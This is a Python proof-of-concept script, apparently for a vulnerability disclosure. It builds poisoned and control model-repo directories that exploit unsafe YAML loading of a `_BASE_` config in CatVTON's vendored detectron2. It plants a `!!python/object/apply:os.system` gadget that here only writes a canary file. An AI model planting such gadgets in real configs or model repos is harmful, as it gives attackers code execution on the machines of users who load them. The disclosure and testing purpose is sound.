#!/usr/bin/env python3
"""
make_poc.py -- build the attack and negative-control CatVTON model-repo directories.

Vulnerability : Zheng-Chong/CatVTON @ 7818397f25613beedb3d861a34769f607cfcf3b1
                vendored detectron2 config loader recurses into the `_BASE_`
                document with allow_unsafe=True (detectron2/config/config.py:37)
Root key      : catvton.three_aux_artifacts-2

Layout produced (mirrors the real Hugging Face repo `zhengchong/CatVTON`,
which ships exactly DensePose/densepose_rcnn_R_50_FPN_s1x.yaml +
DensePose/Base-DensePose-RCNN-FPN.yaml):

    work/attack/DensePose/
        densepose_rcnn_R_50_FPN_s1x.yaml        _BASE_ -> Base-DensePose-RCNN-FPN.yaml
        Base-DensePose-RCNN-FPN.yaml            *carries the YAML object tag*
        Base-DensePose-RCNN-FPN-vendor.yaml     plain mapping (present, unreferenced)
    work/control/DensePose/
        densepose_rcnn_R_50_FPN_s1x.yaml        _BASE_ -> Base-DensePose-RCNN-FPN-vendor.yaml
        Base-DensePose-RCNN-FPN.yaml            byte-identical to the attack copy
        Base-DensePose-RCNN-FPN-vendor.yaml     plain mapping

The two model directories differ in exactly one decision: the value of the
`_BASE_` string in the top-level YAML.  Both keep the same unsafe secondary
document on disk, so the run isolates the *second-file selection* step.

The payload is inert by design: it writes a marker file and nothing else
(canary-only discipline).  It reads the marker path from the environment
variable CANARY so that the two secondary documents stay byte-identical.
"""

import hashlib
import json
import os
import shutil
import sys

import yaml

HERE = os.path.dirname(os.path.abspath(__file__))
MODEL_REPO = os.path.join(HERE, "model_repo")
WORK = os.path.join(HERE, "work")

TOP_YAML = "densepose_rcnn_R_50_FPN_s1x.yaml"
UNSAFE_BASE = "Base-DensePose-RCNN-FPN.yaml"
VENDOR_BASE = "Base-DensePose-RCNN-FPN-vendor.yaml"

# The payload: a plain PyYAML object tag.  `os.system` is the canonical
# `!!python/object/apply` gadget; here it only echoes a marker into the file
# named by %CANARY% (cmd.exe expands the variable), so nothing is harmed.
PAYLOAD = (
    '  MAX_ITER: !!python/object/apply:os.system '
    '["echo CATVTON-UNSAFE-YAML-CANARY > %CANARY%"]'
)
PAYLOAD_ANCHOR = "  MAX_ITER: 90000"


def sha256(path):
    h = hashlib.sha256()
    with open(path, "rb") as fh:
        for chunk in iter(lambda: fh.read(65536), b""):
            h.update(chunk)
    return h.hexdigest()


def build_unsafe_base():
    """Take the pristine HF base config and swap one scalar for an object tag."""
    with open(os.path.join(MODEL_REPO, UNSAFE_BASE), "r", encoding="utf-8") as fh:
        text = fh.read()
    if PAYLOAD_ANCHOR not in text:
        sys.exit("ERROR: anchor %r not found in %s" % (PAYLOAD_ANCHOR, UNSAFE_BASE))
    return text.replace(PAYLOAD_ANCHOR, PAYLOAD)


def build_top_yaml(base_name):
    """Top-level config: the pristine HF file with `_BASE_` repointed."""
    with open(os.path.join(MODEL_REPO, TOP_YAML), "r", encoding="utf-8") as fh:
        text = fh.read()
    return text.replace(
        '_BASE_: "%s"' % UNSAFE_BASE,
        '_BASE_: "%s"' % base_name,
        1,
    )


def write(path, text):
    os.makedirs(os.path.dirname(path), exist_ok=True)
    with open(path, "w", encoding="utf-8", newline="\n") as fh:
        fh.write(text)


def main():
    if os.path.isdir(WORK):
        shutil.rmtree(WORK)

    with open(os.path.join(MODEL_REPO, VENDOR_BASE), "r", encoding="utf-8") as fh:
        vendor_text = fh.read()
    unsafe_text = build_unsafe_base()

    # --- sanity: the whole point of the finding -------------------------------
    top_attack = build_top_yaml(UNSAFE_BASE)
    top_control = build_top_yaml(VENDOR_BASE)
    safe_top = yaml.safe_load(top_attack)          # must succeed
    assert safe_top["_BASE_"] == UNSAFE_BASE, safe_top
    try:
        yaml.safe_load(unsafe_text)                # must fail
    except yaml.constructor.ConstructorError as exc:
        safe_err = str(exc).splitlines()[0]
    else:
        sys.exit("ERROR: the secondary document parsed safely -- PoC is wrong")
    print("[*] top-level YAML      : yaml.safe_load OK, _BASE_ = %r" % safe_top["_BASE_"])
    print("[*] secondary (attack)  : yaml.safe_load raises -> %s" % safe_err)

    for mode, top_text, base_name in (
        ("attack", top_attack, UNSAFE_BASE),
        ("control", top_control, VENDOR_BASE),
    ):
        d = os.path.join(WORK, mode, "DensePose")
        write(os.path.join(d, TOP_YAML), top_text)
        write(os.path.join(d, UNSAFE_BASE), unsafe_text)     # identical in both dirs
        write(os.path.join(d, VENDOR_BASE), vendor_text)     # identical in both dirs
        print("[*] built %s -> _BASE_ = %s" % (d, base_name))

    # --- hashes ---------------------------------------------------------------
    sums = os.path.join(HERE, "SHA256SUMS.txt")
    lines = []
    for root, _dirs, files in os.walk(WORK):
        for name in sorted(files):
            p = os.path.join(root, name)
            lines.append("%s  %s" % (sha256(p), os.path.relpath(p, HERE).replace("\\", "/")))
    for name in (TOP_YAML, UNSAFE_BASE, VENDOR_BASE):
        p = os.path.join(MODEL_REPO, name)
        lines.append("%s  %s" % (sha256(p), os.path.relpath(p, HERE).replace("\\", "/")))
    with open(sums, "w", encoding="utf-8", newline="\n") as fh:
        fh.write("\n".join(lines) + "\n")
    print("[*] wrote %s (%d entries)" % (os.path.relpath(sums, HERE), len(lines)))

    # --- machine-readable expectation ----------------------------------------
    exp = {
        "attack": {
            "model_dir": "work/attack/DensePose",
            "base_selected": UNSAFE_BASE,
            "canary": "work/attack/canary_attack.txt",
            "expect_canary": True,
        },
        "control": {
            "model_dir": "work/control/DensePose",
            "base_selected": VENDOR_BASE,
            "canary": "work/control/canary_control.txt",
            "expect_canary": False,
        },
    }
    with open(os.path.join(HERE, "expected.json"), "w", encoding="utf-8", newline="\n") as fh:
        json.dump(exp, fh, indent=2)
        fh.write("\n")
    print("[*] wrote expected.json")


if __name__ == "__main__":
    main()
